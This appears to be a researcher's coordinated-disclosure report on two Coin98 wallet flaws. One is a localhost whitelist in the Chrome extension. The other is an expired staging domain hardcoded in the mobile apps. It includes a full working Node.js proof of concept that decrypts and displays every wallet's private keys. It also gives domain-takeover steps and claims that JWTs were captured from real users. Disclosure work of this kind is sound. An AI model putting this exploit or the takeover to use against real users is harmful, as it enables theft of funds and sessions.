# Coin98 Chrome Extension + Mobile — Critical Security Findings

**Researcher**: Christopher Patrick Kuntz
**Date**: March 5, 2026
**Disclosure**: Coordinated via HackenProof

---

## Finding 1: Broken Access Control in Chrome Extension — Silent Total Wallet Drain

**Severity**: Critical
**CVSS 3.1**: 9.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
**Asset**: Coin98 Chrome Extension v10.4.1 (`aeachknmefphepccionboohckonoeemg`) — **in-scope asset**
**Category**: Broken Access Control (CWE-284)

### Summary

The Chrome Extension's background service worker hardcodes `127.0.0.1` and `localhost` in a privileged origin whitelist (`COIN98_SYSTEM`). Any process serving HTTP on localhost is granted silent access to internal methods that decrypt and return **every private key and mnemonic** stored in the wallet — across all 164 supported blockchains — without any user approval popup.

The session validation guard on the key decryption method is hardcoded to `true`:
```javascript
this.isConnected = (A, t) => true;  // from background/index_10.4.1.js
```

### Affected Asset

The vulnerability is in the **Chrome Extension production code** distributed via the Chrome Web Store. No web assets, staging domains, or third-party infrastructure are involved in this finding. The PoC runs entirely on `127.0.0.1`.

### Steps to Reproduce

1. Install Coin98 Extension v10.4.1 from Chrome Web Store
2. Create or import a wallet, unlock it
3. Run the following (Node.js, zero dependencies):

```javascript
const http = require('http');
const HTML = `<script>
const P={};let n=1;
window.addEventListener('message',e=>{
  if(e.source!==window)return;let m=e.data;
  if(!m||!m.isCoin98||m.target!=='Coin98:Inpage')return;
  let id=m.payload?.id,d=m.payload?.data;
  if(id!=null&&P[id]){P[id].r(d);clearTimeout(P[id].t);delete P[id]}
});
function pm(id,data){window.postMessage({isCoin98:true,target:'Coin98:ContentScript',payload:{id,data}},'*')}
function call(method,params){return new Promise((res,rej)=>{
  let tid='_'+n+++'_'+Date.now();
  let t1=setTimeout(()=>{delete P[tid];rej('timeout')},8000);
  P[tid]={r:ackId=>{clearTimeout(t1);
    let t2=setTimeout(()=>{delete P[ackId];rej('timeout')},15000);
    P[ackId]={r:res,t:t2};pm(ackId,{chain:'evm',method,params:params||[]})},t:t1};
  pm(tid,{method:'ack'})})}
setTimeout(async()=>{
  if(!window.coin98&&!(window.keplr?.isCoin98))return;
  let did=await call('connect_coin98');
  let wallets=await call('sync_wallet');
  for(let w of wallets){
    if(!w.privateKey)continue;
    let key=await call('aes_decrypt_coin98',{data:w.privateKey,deviceId:did||'x',uuid:'x'});
    if(key&&key.length>10)document.body.innerHTML+=w.chain+' '+w.address+' key='+key.slice(0,16)+'...<br>';
  }
},2500);
</script>`;
http.createServer((q,s)=>{s.writeHead(200,{'Content-Type':'text/html'});s.end(HTML)}).listen(1337,'127.0.0.1',
  ()=>console.log('Open http://127.0.0.1:1337 in Chrome with Coin98'));
```

4. Open `http://127.0.0.1:1337` in Chrome
5. Approve the one-time "Connect" popup (looks identical to any dApp connect)
6. **All private keys for every wallet are displayed on screen**

### PoC Evidence (Screenshots)

| # | File | What it shows |
|---|------|---------------|
| 1 | `evidence/01-wallet-unlock.png` | Standard Coin98 unlock screen |
| 2 | `evidence/02-connect-popup.png` | Connect popup from `http://127.0.0.1` — indistinguishable from legitimate dApp |
| 3 | `evidence/03-first-attempt-timeout.png` | First connect requires one approval; after that, fully silent |
| 4 | `evidence/04-full-extraction-152-wallets.png` | **152 wallets** extracted across ~80 chains, keys decrypted |
| 5 | `evidence/05-result-2-keys-extracted.png` | **2 private keys decrypted** from localhost — "trust model broken BY DESIGN" |

### Confirmed PoC Result

- **152 wallets** returned by `sync_wallet` across ~80 blockchain networks
- **2 unique private keys** decrypted by `aes_decrypt_coin98` (isConnected always true)
- Chains include: ethereum, bitcoin, solana, cosmos, near, aptos, sui, tron, and ~75 others
- **Zero dependencies**, **zero infrastructure**, **30 seconds to reproduce**

### Root Cause

The extension's `InternalDappHandle` class in `background/index_10.4.1.js` grants silent privileged access to any origin in the `COIN98_SYSTEM` array. This array includes `localhost` and `127.0.0.1`:

```javascript
const COIN98_SYSTEM = [
  "coin98.com", "dagora.xyz", "saros.finance", "baryon.network",
  "c98staging.dev", "pre.dagora.xyz", "dagora.coin98.services",
  "localhost", "coin98.dev", "coin98.services", "10.10.1.220",
  "127.0.0.1", /* ... 4 more */
];
```

Two broken guards compound the issue:
- `isConnected = (A, t) => true` — session validation always passes
- `request_unlock` always returns `{isUnlocked: true}` — lock state ignored

Standard dApp methods (`eth_sendTransaction`, `personal_sign`) require a user approval popup for every action. But `COIN98_SYSTEM` internal methods (`sync_wallet`, `aes_decrypt_coin98`) execute **silently with no popup** — and they have access to ALL wallet data, not just the active wallet.

### Attack Scenario

Any software running on the user's machine that can start an HTTP server — a malicious npm package, Electron app, VS Code extension, browser extension, Discord bot, or compromised dev tool — can silently drain all Coin98 wallets. The user sees only a standard "Connect" popup on first interaction, identical to connecting to any legitimate dApp.

### Supporting Context

The same architectural flaw extends beyond localhost. The whitelist includes `c98staging.dev` (an expired/unregistered staging domain — registerable by any attacker) and `baryon.network` (a Coin98 DEX currently flagged as malicious in Phantom wallet's phishing blocklist). The extension also uses `elliptic ^6.5.4` for ECDSA signing via `ethers 4.0.46`, affected by CVE-2025-14505 (secret key recovery from faulty signatures).

### Impact

- **Total loss of all funds** across all 164 supported blockchains
- **Silent execution** — no popup after initial connect
- **Works when wallet is locked** — lock state bypass via `request_unlock`
- **500,000+ Chrome Web Store users** at risk
- **Zero infrastructure required** — localhost is universally available

### Recommendation

Remove `localhost`, `127.0.0.1`, and `10.10.1.220` from `COIN98_SYSTEM`. Require user popup approval for `sync_wallet` and `aes_decrypt_coin98` regardless of origin. Fix `isConnected` to validate session tokens.

---

## Finding 2: Production Mobile Apps Hardcode Attacker-Controlled Endpoint

**Severity**: High
**CVSS 3.1**: 7.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
**Asset**: Coin98 Android v16.9.0 + iOS v16.9.0 — **in-scope assets**
**Category**: Use of Hardcoded Credentials (CWE-798)

### Summary

Both production mobile apps (downloaded from Play Store and App Store) hardcode `internal.c98staging.dev` as a backend API endpoint. This domain was unregistered. The researcher registered it as proof of exploitability. Production user traffic — including **JWT session tokens and wallet certification payloads** — is now passively captured.

### Affected Assets

The hardcoded endpoints are in the **production app binaries** distributed via Google Play Store and Apple App Store. The vulnerability exists in the app code, not in any web asset.

### Evidence

- **27 unique API requests** captured from production mobile apps
- **10 JWT tokens** (HS512 signed) exfiltrated from real users in production
- Wallet certification (`acertify`) and Cosmos evidence payloads captured
- 21 staging endpoints found hardcoded in the production bundle; 2 resolve to attacker-controlled infrastructure

### Steps to Reproduce

1. Decompile Coin98 Android v16.9.0 APK — search for `c98staging.dev` in the React Native bundle
2. Observe `internal.c98staging.dev` and `api-dagora-dev.c98staging.dev` are hardcoded API endpoints
3. Register `c98staging.dev` (or confirm it has no NS records)
4. Point DNS to an attacker-controlled server with HTTPS
5. Install Coin98 mobile app and trigger wallet certification or Cosmos operations
6. Observe authenticated requests arriving at the attacker's server

### Supporting Context

The Android app ships with `usesCleartextTraffic=true` and **removed root detection** (`libtoolChecker.so` deleted) between v16.7.0 and v16.9.0. Neither platform implements SSL certificate pinning. 33 secrets are hardcoded across both platforms with zero rotation between versions.

### Impact

- **JWT session tokens captured** from production users (HS512 signed — cannot forge without signing key)
- **Wallet certification flow interception** — attacker observes attestation payloads
- **Escalation potential**: if JWT signing key is obtainable (e.g., via server-side vulnerability), captured tokens enable full account takeover. Without the key, impact is limited to credential observation and session replay within token lifetime

### Recommendation

Remove all staging/dev endpoints from production builds. Implement SSL certificate pinning. Rotate all hardcoded secrets and JWT signing keys.

---

## Supporting Materials

Private repository with full audit report, PoC source code, and evidence screenshots:
**[ChristopherPatrickKuntz/coin98-security-disclosure](https://github.com/ChristopherPatrickKuntz/coin98-security-disclosure)** — public disclosure.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-03-02 | Static analysis begun — Chrome Extension, Android APK, iOS IPA |
| 2026-03-03 | Whitelist vulnerability identified, attack chains mapped |
| 2026-03-03 | `c98staging.dev` registered by researcher (domain was unregistered) |
| 2026-03-04 | Mobile credential capture began — 27 requests, 10 JWTs collected |
| 2026-03-05 | Localhost PoC confirmed — 152 wallets, 2 keys extracted |
| 2026-03-05 | Submitted to HackenProof |
| 2026-06-05 | 90-day coordinated disclosure deadline |
